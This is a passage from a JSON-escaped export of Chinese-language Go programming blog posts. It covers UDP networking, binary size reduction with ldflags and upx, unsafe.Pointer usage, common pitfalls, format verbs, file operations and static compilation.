\u0026amp;net.UDPAddr{IP: net.ParseIP(\u0026#34;127.0.0.1\u0026#34;), Port: 12345}) if err != nil { fmt.Println(err) return } fmt.Printf(\u0026#34;Local: \u0026lt;%s\u0026gt; \\n\u0026#34;, listen.LocalAddr().String()) data := make([]byte, 1024) for { n, remoteAddr, err := listen.ReadFromUDP(data) if err != nil { fmt.Printf(\u0026#34;error during read: %s\u0026#34;, err) } fmt.Printf(\u0026#34;\u0026lt;%s\u0026gt; %s\\n\u0026#34;, remoteAddr, data[:n]) _, err = listen.WriteToUDP([]byte(\u0026#34;world\u0026#34;), remoteAddr) if err != nil { fmt.Printf(err.Error()) } } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-udp-%E7%BC%96%E7%A8%8B/","title":"Go UDP 编程"},{"content":"Go 编译优化 前言 减小编译后的二进制的体积，能够加快程序的发布和安装过程。\n接下来我们将通过 go 编译选项和第三方工具学习如何减少编译后二进制的体积。\n一、添加编译选项 Go 编译器默认编译出来的程序会带有符号表和调试信息，一般来说 release 版本可以去除调试信息以减小二进制体积：\n1 go build -ldflags=\u0026#34;-s -w\u0026#34; -o main main.go 参数详解：\n-s: 忽略符号表和调试信息； -w: 忽略DWARFv3调试信息，使用该选项后将无法使用 gdb 进行调试。 二、使用 upx 减小体积 upx 是一个常用的压缩动态库和可执行文件的工具，支持 Windows 和 Linux，通常可减少 50-70% 的体积。\nCentos安装方法：\n1 2 3 4 5 6 7 8 9 # 1. 安装 ucl wget -c http://ftp.tu-chemnitz.de/pub/linux/dag/redhat/el7/en/x86_64/rpmforge/RPMS/ucl-1.03-2.el7.rf.x86_64.rpm rpm -Uvh ucl-1.03-2.el7.rf.x86_64.rpm yum install ucl # 2. 安装 upx wget -c http://ftp.tu-chemnitz.de/pub/linux/dag/redhat/el7/en/x86_64/rpmforge/RPMS/upx-3.91-1.el7.rf.x86_64.rpm rpm -Uvh upx-3.91-1.el7.rf.x86_64.rpm yum install upx upx 有很多参数，最重要的则是压缩率，1-9，1 代表最低压缩率，9 代表最高压缩率。我们可以先添加编译选项优化再使用 upx 进行压缩：\n1 go build -ldflags=\u0026#34;-s -w\u0026#34; -o main main.go \u0026amp;\u0026amp; upx -9 main 参考：\n减小 Go 代码编译后的二进制体积 | Go 语言高性能编程 | 极客兔兔 (geektutu.com)\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96/","title":"Go 编译优化"},{"content":"Go 的三种指针 在 Go 语言中，存在着三种指针：类型安全指针、unsafe.Pointer 和 uintptr 。在日常开发中，经常使用的就是类型安全指针。但是在一些特殊场景下，需要用到其他两种指针才能实现需求。\n三种指针间可以进行相互转换，其转换关系为：\ngraph LR A(类型安全指针) --\u0026gt; B(unsafe.Pointer) B--\u0026gt;A B--\u0026gt;C(uintptr) C--\u0026gt;B 一、类型安全指针 类型安全指针是在日常开发中最常使用的指针。类型安全指针用法与 C 语言中的类似，但是在 Go 中的类型安全指针没法像 C 语言那样对指针进行算术操作，只能进行取值和取地址、类型转换和比较。\n取值和取地址：\n1 2 3 4 5 func main() { p1 := new(int) // 创建一个 *int 类型的指针 fmt.Println(p1) // 输出十六进制的地址 fmt.Println(*p1) // 输出 0 } 类型转换和比较：\n当两个指针类型变量的底层类型一致时，才能进行比较和显示转换。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 type MyInt int type PInt *int type PMyInt *MyInt func main() { p1 := new(int) // p1 类型为 *int var p2 IntB = p1 // p2底层类型是*int fmt.Println(p1 == p2) // out: true p3 := new(IntA) // p3 类型为 *IntA var p4 IntC = p3 // p4 底层类型是 *IntA fmt.Println(p3 == p4) // out: true //fmt.Println(p1 == p3) // invalid operation: p1 == p3 (mismatched types *int and *IntA) } 二、unsafe.Pointer unsafe.Pointer 是由 unsafe 包提供的类型，它被称为非安全指针类型。\n1 2 3 4 5 6 // ArbitraryType is here for the purposes of documentation only and is not actually // part of the unsafe package. It represents the type of an arbitrary Go expression. type ArbitraryType int // Pointer represents a pointer to an arbitrary type. type Pointer *ArbitraryType 在 unsafe 包中同时也提供了以下五种函数:\n1 2 3 4 5 6 7 8 9 10 func Sizeof(x ArbitraryType) uintptr func Offsetof(x ArbitraryType) uintptr func Alignof(x ArbitraryType) uintptr // 以下两个函数从 go1.17 开始提供 func Add(ptr Pointer, len IntegerType) Pointer func Slice(ptr *ArbitraryType, len IntegerType) []ArbitraryType Sizeof(x ArbitraryType)：该函数用来获取一个值的类型的大小（等同于 C 语言的 sizeof）。在同样的编译环境下，同一类型的不同值获取到的类型大小相同。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 func main() { fmt.Println(unsafe.Sizeof(int(1))) // 8 fmt.Println(unsafe.Sizeof(byte(1))) // 1 fmt.Println(unsafe.Sizeof(int64(1))) // 8 fmt.Println(unsafe.Sizeof(int32(1))) // 4 /* 在 src/runtime/string.go 中可以发现字符串的结构体实现 type stringStruct struct { str unsafe.Pointer // 8 len int // 8 } */ fmt.Println(unsafe.Sizeof(\u0026#34;123\u0026#34;)) // 16 fmt.Println(unsafe.Sizeof(\u0026#34;\u0026#34;)) // 16 /* 在 src/runtime/slice.go 中可以发现字符串的结构体实现 type slice struct { array unsafe.Pointer // 8 len int // 8 cap int // 8 } */ fmt.Println(unsafe.Sizeof([]byte{})) // 24 fmt.Println(unsafe.Sizeof([]byte{1, 2, 3})) // 24 fmt.Println(unsafe.Sizeof([2]byte{1, 2})) // 2 fmt.Println(unsafe.Sizeof([3]byte{1, 2})) // 3 fmt.Println(unsafe.Sizeof(uintptr(1))) // 8 fmt.Println(unsafe.Sizeof(map[string]string{\u0026#34;1\u0026#34;: \u0026#34;1\u0026#34;})) // 8 fmt.Println(unsafe.Sizeof(map[string]struct{}{\u0026#34;1\u0026#34;: {}})) // 8 fmt.Println(unsafe.Sizeof(make(chan error, 1))) // 8 } Alignof(x ArbitraryType)：该函数会返回一个类型的对齐值，也可以叫做对齐系数或者对齐倍数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 func main() { var ( b bool i8 int8 i16 int16 i64 int64 f32 float32 s string p *int ) fmt.Println(unsafe.Alignof(b)) // 1 fmt.Println(unsafe.Alignof(i8)) // 1 fmt.Println(unsafe.Alignof(i16)) // 2 fmt.Println(unsafe.Alignof(i64)) // 8 fmt.Println(unsafe.Alignof(f32)) // 4 fmt.Println(unsafe.Alignof(s)) // 8 fmt.Println(unsafe.Alignof(p)) // 8 } Offsetof(x ArbitraryType)：该函数用来获取一个结构体某个字段相对于次结构体的地址偏移量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 type User struct { Name string Age int Sex byte } func main() { u := User{ Name: \u0026#34;Lynx\u0026#34;, Age: 18, Sex: 1, } fmt.Println(unsafe.Offsetof(u.Name)) // 0 fmt.Println(unsafe.Offsetof(u.Age)) // 16 fmt.Println(unsafe.Offsetof(u.Sex)) // 24 fmt.Println(unsafe.Sizeof(u)) // 32 } Add(ptr Pointer, len IntegerType)：此函数在一个非安全指针表示的地址上添加一个偏移量，然后返回表示新地址的一个指针。\nSlice(ptr *ArbitraryType, len IntegerType)：此函数从一个任意（安全）指针派生出一个指定长度的切片。\n三、uintptr uintptr 是一个整数类型，能够存放任意指针。uintptr 可以像 C 语言里面的指针一样进行运算操作。但是 Go 里面的类型安全指针不能直接转换成 uintptr 指针，必须先转换成 unsafe.Pointer 类型，再转换成 uintptr。\n1 2 // uintptr is an integer type that is large enough to hold the bit pattern of any pointer. type uintptr uintptr 四、正确使用 unsafe.Pointer 在 unsafe 包中列举了六种 unsafe.Pointer 的场景，如果不是以下使用场景，我们在使用 unsafe.Pointer 时可能会无效。\n// Code not using these patterns is likely to be invalid today or to become invalid in the future.\n// Even the valid patterns below come with important caveats.\n1. 类型转换 1 2 3 func Float64bits(f float64) uint64 { return *(*uint64)(unsafe.Pointer(\u0026amp;f)) } 在转换过程中，unsafe.Pointer充当桥梁，将 float64 类型转换为 uint64。 注意目标类型的尺寸不应该大于原始类型，否则会出现溢出异常。\n2. Pointer 转换为 uintptr（不逆转换） 将 unsafe.Pointer 转换为 uintptr 类型，这种转换一般只用于打映内存地址。由于 GC 的存在，将 uintptr 转换回 unsafe.Pointer 的操作可能是无效操作（对象被 GC 回收）。\n获得到的 uintptr 只是一个没有指针语义得整数值。当对象地址发生变更时，获得到的 uintptr 不会发生变化。\n1 2 3 4 5 func main() { a := 10 fmt.Printf(\u0026#34;%p\\n\u0026#34;, \u0026amp;a) fmt.Printf(\u0026#34;%d\\n\u0026#34;, uintptr(unsafe.Pointer(\u0026amp;a))) } 3. 指针运算 我们可以对 uintptr 做运算操作，从而获取到其他地址的值。这种模式常用来访问结构体字段或者数组的地址。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 type MyType struct { f1 uint8 f2 int f3 uint64 } func main() { fmt.Println(\u0026#34;结构体: \u0026#34;) s := MyType{f1: 10, f2: 20, f3: 30} fmt.Println(\u0026#34;f1 地址：\u0026#34;, uintptr(unsafe.Pointer(\u0026amp;s))) fmt.Println(\u0026#34;f1 值：\u0026#34;, *(*uint8)(unsafe.Pointer(\u0026amp;s))) fmt.Println(\u0026#34;f2 地址：\u0026#34;, uintptr(unsafe.Pointer(\u0026amp;s))+unsafe.Offsetof(s.f2)) fmt.Println(\u0026#34;f2 值：\u0026#34;, *(*int)(unsafe.Pointer(uintptr(unsafe.Pointer(\u0026amp;s)) + unsafe.Offsetof(s.f2)))) fmt.Println(\u0026#34;f3 地址：\u0026#34;, uintptr(unsafe.Pointer(\u0026amp;s))+unsafe.Offsetof(s.f3)) fmt.Println(\u0026#34;f3 值：\u0026#34;, *(*int)(unsafe.Pointer(uintptr(unsafe.Pointer(\u0026amp;s)) + unsafe.Offsetof(s.f3)))) // 上面这种进对 uintptr 进行运算的操作，在 go1.17后的版本推介使用 unsafe.Add() fmt.Println(\u0026#34;f3 地址：\u0026#34;, uintptr(unsafe.Add(unsafe.Pointer(\u0026amp;s), unsafe.Offsetof(s.f3)))) fmt.Println(\u0026#34;\\n数组: \u0026#34;) arr := [3]int{11, 22, 33} fmt.Printf(\u0026#34;%p\\n\u0026#34;, \u0026amp;arr) for i := 0; i \u0026lt; 3; i++ { fmt.Printf(\u0026#34;arr[%d] addr: %x\\n\u0026#34;, i, uintptr(unsafe.Pointer(\u0026amp;arr[0]))+uintptr(i)*unsafe.Sizeof(arr[0])) fmt.Printf(\u0026#34;arr[%d] value: %d\\n\u0026#34;, i, *(*int)(unsafe.Pointer(uintptr(unsafe.Pointer(\u0026amp;arr[0])) + uintptr(i)*unsafe.Sizeof(arr[0])))) } } :exclamation::exclamation::exclamation:注意：\n在进行上面的指针计算时，不能将获得的地址赋值给临时变量。如下面这种用法就是有问题的：\n1 2 3 f2Addr := uintptr(unsafe.Pointer(\u0026amp;s))+unsafe.Offsetof(s.f2) ... other code fmt.Println(*(*int)(unsafe.Pointer(f2Addr))) 在执行 other code 的过程中，变量 s 可能会因为不被其他任何变量引用，导致被 GC 回收了内存空间。因此在将 f2Addr 转换为 unsafe.Pointer 的时候就会爆出非法指针的错误。\n因此，我们在涉及到指针的转换时，需要在一行代码内完成指针转换，因为编译器会保证当前行代码的转换是有效的。\n同样的，我们也不能够将获得的 uintptr 作为函数变量传递给其他函数（除了下面这种模式）。\n4. 系统调用 在上面的介绍中，我们知道将 uintptr 作为变量传递给一个普通函数是一种非法的行为。\n但是，将 uintptr 变量传递给 syscall.Syscall 这样的函数是安全的，其他自定义的函数无法享受到这样的特权。这是编译器进行的安全保证。\n5. 将 reflect.Value.Pointer/UnsafeAddr 方法的 uintptr 返回值转换为非类型 安全指针 reflect标准库中Value类型的Pointer和UnsafeAddr方法都返回一个uintptr值，而不是一个unsafe.Pointer值。\nGo 团队这样设计的初衷是避免用户不引用unsafe标准库包就可以将这两个方法的返回值转换为任何类型安全指针类型。\n但是由于返回的值是 uintptr 类型的，因此必须在返回的时候就立即将其转换为非类型安全的指针，否则就有可能因为 GC 回收变量导致触发非法指针错误。\n1 2 3 4 5 6 7 // 安全 p := (*int)(unsafe.Pointer(reflect.ValueOf(new(int)).Pointer())) // 不安全！！！ u := reflect.ValueOf(new(int)).Pointer() // 在这个时刻，处于存储在 u 中的地址处的内存块可能会被回收掉。 p := (*int)(unsafe.Pointer(u)) 不过在 go 1.18 版本后，reflect.Value 引入了一个新的方法: func (v Value) UnsafePointer() unsafe.Pointer，该方法返回一个 unsafe.Pointer 变量。官方推介使用这个方法来代替之前的 Pointer 和 UnsafeAddr 方法，用以解决原来设计思路的问题。\n6. 将 reflect.SliceHeader 或 reflect.StringHeader 的 Data 字段转换成非安全类型，或反之操作 SliceHeader 和 StringHeader 分别是数字和字符串的实现结构体，由于两个结构体十分类似，可以利用他们实现字符串和 byte 数组零内存拷贝转换。\n1 2 3 4 5 6 7 8 9 10 11 func String2Bytes(s string) []byte { stringHeader := (*reflect.StringHeader)(unsafe.Pointer(\u0026amp;s)) var b []byte pbytes := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;b)) pbytes.Data = stringHeader.Data pbytes.Len = stringHeader.Len pbytes.Cap = stringHeader.Len return b } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E7%9A%84%E4%B8%89%E7%A7%8D%E6%8C%87%E9%92%88/","title":"Go 的三种指针"},{"content":"Go 防踩坑编程指南 本指南指在记录自己平时写代码过程中踩过的坑\n1. 不要使用 init() 函数 init() 函数是 Go 中提供默认函数，当 init() 函数所在模块被加载时，init() 函数会自动运行。\n但是由于模块加载顺序和 import 中的顺序强相关，因此不同模块的 init() 函数执行顺序会不可控。当模块之间存在依赖时，init() 函数很大概率会由于执行顺序出现问题而造成出人意料的 Bug（特别是启用了go fmt功能！）。\n因此在日常开发中不到万不得已不要使用 init() 函数，初始化逻辑直接显示调用。\n2. 全局变量显示初始化 复杂的全局变量初始化时，应当显示进行初始化。原因和 1. 不要使用 init() 函数 类似。因为全局变量初始化顺序和模块加载顺序强相关。当全局变量初始化逻辑存在依赖时，可能会由于模块加载顺序改变而产生出人意料的 Bug。\n3. 判断接口类型是否为 nil 在 Go 中，当对象值为空，但是接口类型不为空时，如果直接判断 v != nil 会返回 true。\n在下面的代码中，u != nil 会判断为空，因为 u 的值虽然为 nil，但是 u 的类型为 UserI。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package main type UserI interface { String() string } type User struct { Id string } func (u *User) String() string { return u.Id } func GetUser() UserI { var u *User return u } func main() { u := GetUser() if u != nil { u.String() } } 因此为了避免这种问题的出现，需要使用反射做更严格的判断：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package main import ( \u0026#34;reflect\u0026#34; ) type UserI interface { String() string } type User struct { Id string } func (u *User) String() string { return u.Id } func GetUser() UserI { var u *User return u } func IsNilPointer(i interface{}) bool { if i == nil { return true } v := reflect.ValueOf(i) return (v.Kind() == reflect.Ptr || v.Kind() == reflect.Interface) \u0026amp;\u0026amp; v.IsNil() } func main() { u := GetUser() if !IsNilPointer(u) { u.String() } } 4. 考虑 data race 运行程序时，统一添加参数 -race 来检测是否存在 Data Race，防止后面的并发执行过程中出现问题。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E9%98%B2%E8%B8%A9%E5%9D%91%E7%BC%96%E7%A8%8B%E6%8C%87%E5%8D%97/","title":"Go 防踩坑编程指南"},{"content":"Go 格式化占位符使用 1 2 3 4 5 6 # 定义示例类型和变量 type Human struct { Name string } var people = Human{Name:\u0026#34;zhangsan\u0026#34;} 普通 占位符 说明 举例 输出 %v 相应值的默认格式 Printf(\u0026quot;%v\u0026quot;, people) {zhangsan}， %+v 打印结构体时，会添加字段名 Printf(\u0026quot;%+v\u0026quot;, people) {Name:zhangsan} %#v 相应值的Go语法表示 Printf(\u0026quot;#v\u0026quot;, people) main.Human{Name:\u0026ldquo;zhangsan\u0026rdquo;} %T 相应值的类型的Go语法表示 Printf(\u0026quot;%T\u0026quot;, people) main.Human %% 字面上的百分号，并非值的占位符 Printf(\u0026quot;%%\u0026quot;) % 布尔 占位符 说明 举例 输出 %t true 或 false Printf(\u0026quot;%t\u0026quot;, true) true 整数 占位符 说明 举例 输出 %b 二进制表示 Printf(\u0026quot;%b\u0026quot;, 5) 101 %c 相应Unicode码点所表示的字符 Printf(\u0026quot;%c\u0026quot;, 0x4E2D) 中 %d 十进制表示 Printf(\u0026quot;%d\u0026quot;, 0x12) 18 %o 八进制表示 Printf(\u0026quot;%d\u0026quot;, 10) 12 %q 单引号围绕的字符字面值，由Go语法安全地转义 Printf(\u0026quot;%q\u0026quot;, 0x4E2D) \u0026lsquo;中\u0026rsquo; %x 十六进制表示，字母形式为小写 a-f Printf(\u0026quot;%x\u0026quot;, 13) d %X 十六进制表示，字母形式为大写 A-F Printf(\u0026quot;%x\u0026quot;, 13) D %U Unicode格式：U+1234，等同于 \u0026ldquo;U+%04X\u0026rdquo; Printf(\u0026quot;%U\u0026quot;, 0x4E2D) U+4E2D 浮点数和复数 占位符 说明 举例 输出 %b 二进制表示 Printf(\u0026quot;%b\u0026quot;, 3) 11 %e 科学计数法，例如 -1234.456e+78 Printf(\u0026quot;%e\u0026quot;, 10.2) 1.020000e+01 %E 科学计数法，例如 -1234.456E+78 Printf(\u0026quot;%e\u0026quot;, 10.2) 1.020000E+01 %f 有小数点而无指数，例如 123.456 Printf(\u0026quot;%f\u0026quot;, 10.2) 10.200000 %g 根据情况选择 %e 或 %f 以产生更紧凑的（无末尾的0） Printf(\u0026quot;%g\u0026quot;, 10.20)？ 10.2 %G 根据情况选择 %E 或 %f 以产生更紧凑的（无末尾的0） Printf(\u0026quot;%G\u0026quot;, 10.20+2i) (10.2+2i) 字符串与字节切片 占位符 说明 举例 输出 %s 输出字符串表示（string类型或[]byte) Printf(\u0026quot;%s\u0026quot;, []byte(\u0026ldquo;Go语言\u0026rdquo;)) Go语言 %q 双引号围绕的字符串，由Go语法安全地转义 Printf(\u0026quot;%q\u0026quot;, \u0026ldquo;Go语言\u0026rdquo;) \u0026ldquo;Go语言\u0026rdquo; %x 十六进制，小写字母，每字节两个字符 Printf(\u0026quot;%x\u0026quot;, \u0026ldquo;golang\u0026rdquo;) 676f6c616e67 %X 十六进制，大写字母，每字节两个字符 Printf(\u0026quot;%X\u0026quot;, \u0026ldquo;golang\u0026rdquo;) 676F6C616E67 指针 占位符 说明 举例 输出 %p 十六进制表示，前缀 0x Printf(\u0026quot;%p\u0026quot;, \u0026amp;people) 0x4f57f0 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%8D%A0%E4%BD%8D%E7%AC%A6%E4%BD%BF%E7%94%A8/","title":"Go 格式化占位符使用"},{"content":"Go 工具使用 查看可执行文件信息 1 go version -m .\\app.exe 反汇编 1 2 3 4 5 6 7 8 # 查看所有代码 go tool objdump -S .\\app.exe # 查看单个包 go tool objdump -s \u0026#34;main\u0026#34; .\\app.exe # 查看单个函数 go tool objdump -s \u0026#34;main.main\u0026#34; .\\app.exe ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","title":"Go 工具使用"},{"content":"E/Go: panic: no current JVM # java 调用库之前执行 Seq.setContext(getApplicationContext()) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E5%92%8C-android-%E5%BC%80%E5%8F%91/","title":"Go 和 Android 开发"},{"content":"Go 学习——文件操作 一、读取文件 1. 按字节读取 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 func main() { // 打开读取的文件 file, err := os.Open(\u0026#34;testFile\u0026#34;) // return 之前记得关闭文件 defer file.Close() if err != nil { fmt.Println(err) return } // 每次读取的内容缓存 buf := make([]byte, 1024) // 文件的所有内容 var context []byte for { // 读取文件内容 count, err := file.Read(buf) // 判断是否读到文件尾部 if err == io.EOF { break } curByte := buf[:count] // 追加内容 context = append(context, curByte...) } // 打印文本信息 fmt.Println(string(context)) } 2. 使用 ioutil 进行简化 1 2 3 4 5 6 7 8 9 10 11 12 13 func main() { // 打开读取的文件 file, err := os.Open(\u0026#34;testFile\u0026#34;) // return 之前记得关闭文件 defer file.Close() if err != nil { fmt.Println(err) return } context, _ := ioutil.ReadAll(file) fmt.Println(string(context)) } 1 2 3 4 func main() { context, _ := ioutil.ReadFile(\u0026#34;testFile\u0026#34;) fmt.Println(string(context)) } 3. 利用 Scanner 逐行读取 1 2 3 4 5 6 7 8 9 10 11 12 func main() { file, _ := os.Open(\u0026#34;testFile\u0026#34;) defer file.Close() scanner := bufio.NewScanner(file) count := 0 for scanner.Scan() { count++ line := scanner.Text() fmt.Printf(\u0026#34;%d %s\\n\u0026#34;, count, line) } } 二、写入文件 通过给 os.OpenFile(name string, flag int, perm FileMode) 指定额外的文件权限和读写方式可以实现对文件的写操作。\nflag 有以下常用值：\nos.O_CREATE: create if none exists 不存在则创建 os.O_RDONLY: read-only 只读 os.O_WRONLY: write-only 只写 os.O_RDWR: read-write 可读可写 os.O_TRUNC: truncate when opened 文件长度截为0：即清空文件 os.O_APPEND: append 追加新数据到文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func main() { file, _ := os.OpenFile(\u0026#34;testFile\u0026#34;, os.O_CREATE|os.O_RDWR, 0777) defer file.Close() // 写入 byte 数据 data := []byte(\u0026#34;Hello World!\\n\u0026#34;) _, err := file.Write(data) if err != nil { return } // 写入字符串 _, err = file.WriteString(\u0026#34;Hello World!\\n\u0026#34;) if err != nil { return } // 确保写入到磁盘 err = file.Sync() if err != nil { return } } 三、判断文件是否存在 1 2 3 4 5 func main() { file := \u0026#34;testFile\u0026#34; _, err := os.Stat(file) fmt.Println(!os.IsNotExist(err)) } 四、文件拷贝 1 2 3 4 5 6 7 8 func main() { srcFile, _ := os.Open(\u0026#34;testFile\u0026#34;) defer srcFile.Close() desFile, _ := os.OpenFile(\u0026#34;copyFile\u0026#34;, os.O_WRONLY|os.O_CREATE, os.ModePerm) defer desFile.Close() io.Copy(desFile, srcFile) } 五、改变程序当前工作目录 1 2 3 4 5 6 7 8 func main() { fmt.Println(os.Getwd()) err := os.Chdir(\u0026#34;..\u0026#34;) if err != nil { return } fmt.Println(os.Getwd()) } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E5%9F%BA%E7%A1%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","title":"Go 基础文件操作"},{"content":"Go 检查结构体是否实现接口 编译时检查 1 2 var _ MyInterface = new(MyStruct) var _ MyInterface = (*MyStruct)(nil) 运行时检查 1 reflect.TypeOf(MyStruct{}).Implements(reflect.TypeOf((*MyInterface)(nil)).Elem()) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E6%A3%80%E6%9F%A5%E7%BB%93%E6%9E%84%E4%BD%93%E6%98%AF%E5%90%A6%E5%AE%9E%E7%8E%B0%E6%8E%A5%E5%8F%A3/","title":"Go 检查结构体是否实现接口"},{"content":"Go 静态编译机制 一、Go 的可移植性 众所周知，Go 具有良好的跨平台可移植性，Go 还提供了交叉编译的功能，运行我们在一个平台上编译出另外一个平台可执行的二进制代码。\n在Go 1.7及以后版本中，我们可以通过下面命令查看Go支持OS和平台列表：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 $ go tool dist list aix/ppc64 android/386 android/amd64 android/arm android/arm64 darwin/amd64 darwin/arm64 dragonfly/amd64 freebsd/386 freebsd/amd64 freebsd/arm freebsd/arm64 illumos/amd64 ios/amd64 ios/arm64 js/wasm linux/386 linux/amd64 linux/arm linux/arm64 linux/mips linux/mips64 linux/mips64le linux/mipsle linux/ppc64 linux/ppc64le linux/riscv64 linux/s390x netbsd/386 netbsd/amd64 netbsd/arm netbsd/arm64 openbsd/386 openbsd/amd64 openbsd/arm openbsd/arm64 openbsd/mips64 plan9/386 plan9/amd64 plan9/arm solaris/amd64 windows/386 windows/amd64 windows/arm windows/arm64 可以发现从 linux/arm64的嵌入式系统到 linux/s390x 的大型机系统，再到Windows、linux和 darwin(mac)这样的主流操作系统、amd64、386这样的主流处理器体系，Go 对各种平台和操作系统的支持确实十分广泛。\nGo 的运行机制发现 Go 程序是通过 runtime 这个库实现与操作内核系统交互的。Go 自己实现了 runtime，并封装了syscall，为不同平台上的go user level代码提供封装完成的、统一的go标准库。\n二、Go 的静态链接 首先我们来书写两个程序，一个 C语言的一个 Go 语言的：\n1 2 3 4 5 6 7 # hello.c #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello, C!\\n\u0026#34;); return 0; } 编译后使用 ldd 命令查看其链接库：\n1 2 3 4 5 6 7 8 9 # 1. 编译 gcc -o hc hello.c # 2. 查看其依赖共享库 ldd hc linux-vdso.so.1 =\u0026gt; (0x00007fff85b6e000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007fe87ff1a000) /lib64/ld-linux-x86-64.so.2 (0x00007fe8802e8000) 我们发现这个 C程序编译出来后的二进制文件会需要这三个库文件，因此如果我们将它做移植时会因为缺失动态库文件而造成无法运行。\n接下来我们再试一下 Go 语言的：\n1 2 3 4 5 6 7 package main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello Go!\u0026#34;) } 1 2 3 4 5 6 7 # 1. 编译 go build -o hgo hello.go # 2. 查看依赖 ldd hgo 不是动态可执行文件 我们发现 Go 编译出来的二进制文件是没有需要依赖的共享库的。\n我们再比较一下两个文件的大小：\n1 2 3 4 ll -h -rwxr-xr-x. 1 root root 8.2K 9月 15 10:36 hc -rwxr-xr-x. 1 root root 1.7M 9月 15 10:42 hgo 我们可以发现 Go 编译出来的二进制文件比 C 语言编译出来的文件会大的多，这其实就是因为 Go 在编译时会将依赖库一起编译进二进制文件的缘故。\n三、cgo 影响可移植性 虽然Go默认情况下是采取的静态编译。但是，不是所有情况下，Go都不会依赖外部动态共享库！\n我们来看看下面这段代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, \u0026#34;Hello, you\u0026#39;ve requested: %s\\n\u0026#34;, r.URL.Path) }) http.ListenAndServe(\u0026#34;:80\u0026#34;, nil) } 1 2 3 4 5 6 7 go build -o server server.go ldd server linux-vdso.so.1 =\u0026gt; (0x00007ffd96be5000) libpthread.so.0 =\u0026gt; /lib64/libpthread.so.0 (0x00007f577ade9000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007f577aa1b000) /lib64/ld-linux-x86-64.so.2 (0x00007f577b005000) 编译后我们发现，默认采用 “静态链接” 的 Go 程序怎么也要依赖外部的动态链接库了呢？问题在于 Cgo。\n自C语言出现，已经累积了无数功能强大、性能卓越的C语言代码库，可以说难以替代；为了方便快捷的使用这些C语言库，Go语言提供 Cgo，可以用以在 Go 语言中调用 C语言库。\n默认情况下 Go 语言是使用 Cgo 对 Go 程序进行构建的。当使用 Cgo 进行构建时，如果我们使用的包里用着使用 C 语言支持的代码，那么最终编译的可执行文件都是要有外部依赖的。\n正因为这样才会导致我们编译出来的 Go 程序会有着一些外部依赖。\n四、纯静态编译 为了使我们编译的程序有着更好的可移植性，我们需要进行纯静态编译。有两种方式可以帮助我们进行纯静态编译：\n1. CGO_ENABLED=0 默认情况下，CGO_ENABLED=1，代表着启用 Cgo 进行编译。我们如果将 CGO_ENABLED 置为 0，那么就可以关闭 Cgo：\n1 2 3 4 CGO_ENABLED=0 go build -o server server.go ldd server 不是动态可执行文件 2. 采用external linker cmd/link 有两种工作模式：internal linking和external linking。\ninternal linking：若用户代码中仅仅使用了 net、os/user 等几个标准库中的依赖 cgo 的包时，cmd/link 默认使用 internal linking，而无需启动外部external linker(如:gcc、clang等)； external linking：将所有生成的.o都打到一个.o文件中，再将其交给外部的链接器，比如 gcc 或 clang 去做最终链接处理。 如果我们在写入参数 -ldflags '-linkmode \u0026quot;external\u0026quot; -extldflags \u0026quot;-static\u0026quot;'，那么 gcc/clang 将会去做静态链接，将.o中undefined的符号都替换为真正的代码，从而达到纯静态编译的目的：\n1 2 3 4 go build -o server -ldflags \u0026#39;-linkmode \u0026#34;external\u0026#34; -extldflags \u0026#34;-static\u0026#34;\u0026#39; server.go ldd 不是动态可执行文件 如果在编译时出现以下错误：\n# ahhub.io/dbox/cmd/app /usr/local/go/pkg/tool/linux_amd64/link: running gcc failed: exit status 1 /usr/bin/ld: 找不到 -lpthread /usr/bin/ld: 找不到 -lc collect2: 错误：ld 返回 1 这是因为缺失依赖，下载依赖即可：\n1 yum install glibc-static.x86_64 -y 参考链接：\nCGO_ENABLED环境变量对Go静态编译机制的影响 – 碎言碎语 